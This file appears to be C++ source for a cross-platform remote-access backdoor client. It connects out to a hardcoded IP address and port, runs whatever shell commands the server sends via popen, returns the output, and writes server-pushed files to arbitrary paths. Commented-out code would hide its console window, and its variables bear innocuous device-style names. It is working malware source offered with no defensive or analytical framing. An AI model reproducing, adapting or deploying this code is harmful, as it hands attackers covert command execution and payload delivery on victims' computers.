#ifdef _WIN32
#include <WinSock2.h>
#include <ws2tcpip.h>
#include <iostream>
#include <fstream>
#include <ostream>
#include <string>
#include <unistd.h>
#include <vector>
#include <windows.h>

#define WIN(exp) exp
#define LINUX(exp)

#else
#include <arpa/inet.h>
#include <iostream>
#include <fstream>
#include <ostream>
#include <string>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <vector>

#define WIN(exp)
#define LINUX(exp) exp

#endif // _WIN32

#include <memory>
#include <array>
#include <sstream>

#include <iomanip>
#include <chrono>
#include <thread>

#define SHELL_MODE_BYTE  0xfd
#define UPDATE_MODE_BYTE 0xfc
#define ESTABILISH_BYTE  0xfe
#define KEEP_ALIVE_PING  0xfb

std::string exec(const char *cmd) {
    std::array<char, 128> buff;
    std::string result;

    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);

    if (!pipe) return "";

    while (fgets(buff.data(), buff.size(), pipe.get()) != nullptr)
        result += buff.data();

    return result;
}

std::vector<std::string> split(const std::string& str, char delimiter) {
    std::vector<std::string> tokens;
    std::stringstream strstream(str);
    std::string token;

    while (getline(strstream, token, delimiter)) {
        tokens.push_back(token);
    }

    return tokens;
}

int main(int argc, char **argv) {
    /*if (argc < 3) {
        std::cout << "Usage: " << argv[0] << " <ip-address> <port>" << std::endl;

        return -1;
    }*/

    /*HWND window; 
	AllocConsole(); 
	window = FindWindowA("ConsoleWindowClass", NULL); 
	ShowWindow(window, 0);*/ 

    #ifdef _WIN32
        WSADATA wsa;

        if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
            std::cout << "[FAILED]SYSTEM ERROR" << std::endl;
    #endif

    const char shell_mode      = SHELL_MODE_BYTE;
    const char update_mode     = UPDATE_MODE_BYTE;
    const char estabilish_mode = ESTABILISH_BYTE;
    const char keep_alive_ping = KEEP_ALIVE_PING;

    //const std::string ip_address = argv[1];
    //const std::string port       = argv[2];

    const std::string ip_address = "80.66.79.140";
    const std::string port       = "4446";

    sockaddr_in imx8mm;

    imx8mm.sin_addr.s_addr = inet_addr(ip_address.c_str());
    imx8mm.sin_port        = htons(std::stoi(port));
    imx8mm.sin_family      = AF_INET;

    WIN(SOCKET)LINUX(int32_t) imx8mm_socket = ::socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    if (WIN(imx8mm_socket == INVALID_SOCKET)LINUX(imx8mm_socket < 0)) {
        std::cout << "[FAILED]Socket create failed" << std::endl;

        return -2;
    }

    int32_t imx8mm_debug = ::connect(imx8mm_socket, (const sockaddr *)&imx8mm, sizeof(imx8mm));

    if (WIN(imx8mm_debug == SOCKET_ERROR)LINUX(imx8mm_debug < 0)) {
        std::cout << "[FAILED]Connect error" << std::endl;

        return -3;
    }

    std::vector<char> esta;

    esta.push_back(ESTABILISH_BYTE);

    imx8mm_debug = ::send(imx8mm_socket, esta.data(), esta.size(), 0);

    if (imx8mm_debug < 0) {
        std::cout << "[FAILED]Estabilish connection error" << std::endl;

        return -4;
    }

    std::vector<char> imx8mm_comm_buffer(1024);

    bool update_mode_byte = false;
    bool shell_mode_byte  = false;
    bool keep_alive       = false;

    while (::recv(imx8mm_socket, imx8mm_comm_buffer.data(), 1024, 0)) {
        if (imx8mm_comm_buffer.size() > 0) {
            for (auto& com : imx8mm_comm_buffer) {
                if (com == update_mode)
                    update_mode_byte = true;

                if (com == shell_mode)
                    shell_mode_byte = true;

                if (com == keep_alive_ping)
                    keep_alive = true;
            }

            if (keep_alive) {
                std::cout << "[ INFO ]Client alive" << std::endl;

                std::string keep_alive_buffer;

                keep_alive_buffer.push_back(KEEP_ALIVE_PING);

                if (!::send(imx8mm_socket, keep_alive_buffer.c_str(), keep_alive_buffer.size(), 0))
                    std::cout << "[FAILED]Server closed" << std::endl;

                keep_alive = false;

                imx8mm_comm_buffer.clear();
                imx8mm_comm_buffer.resize(1024);
            }

            else if (update_mode_byte) {
                std::vector<std::string> splitData = split(imx8mm_comm_buffer.data(), update_mode);

                std::string path = splitData.at(0);
                std::string size = splitData.at(1);

                uint32_t file_size = std::stoi(size);
                uint32_t write_size = 0;

                std::cout << "[ INFO ]Readed file name: " << path << std::endl << "[ INFO ]File size: " << size << std::endl;
                
                std::ofstream outputFile(path, std::ofstream::binary);

                if (!outputFile.is_open()) {
                    std::cout << "[FAILED]File create error" << std::endl;

                    close(imx8mm_socket);
                    outputFile.close();

                    return -3;
                }

                char fileBuffer[1024];
                int32_t bytesRead = 0;

                std::cout << "[ INFO ]Start download file" << std::endl;

                while ((bytesRead = ::recv(imx8mm_socket, fileBuffer, 1024, 0)) > 0) {
                    outputFile.write(fileBuffer, bytesRead);

                    write_size += bytesRead;

                    if (write_size == file_size)
                        break;

                    std::cout << "[ INFO ]Downloaded: " << write_size << " target" << file_size << std::endl;
                }

                outputFile.close();

                update_mode_byte = false;

                std::cout << "[ INFO ]File get success" << std::endl;
                
                imx8mm_comm_buffer.clear();
                imx8mm_comm_buffer.resize(1024);
            }

            else if (shell_mode_byte) {
                shell_mode_byte = false;

                std::string execlp;

                for (auto& ch : imx8mm_comm_buffer)
                    if (ch != shell_mode)
                        execlp.push_back(ch);

                std::string command_result = exec(execlp.c_str());

                if (command_result != "")
                    if (::send(imx8mm_socket, command_result.c_str(), command_result.size(), 0)WIN( < 0)LINUX( < 0))
                        std::cout << "[FAILED]Error send command result" << std::endl;

                else if (command_result == "") {
                    command_result = "command failed";

                    if (::send(imx8mm_socket, command_result.c_str(), command_result.size(), 0)WIN( < 0)LINUX( < 0))
                        std::cout << "[FAILED]Send error" << std::endl;
                }

                command_result.clear();
                imx8mm_comm_buffer.clear();
                imx8mm_comm_buffer.resize(1024);
            }

            else {
                std::cout << "mode not found: " << imx8mm_comm_buffer.data() << std::endl;
                
                imx8mm_comm_buffer.clear();
                imx8mm_comm_buffer.resize(1024);
            }
        }
    }
}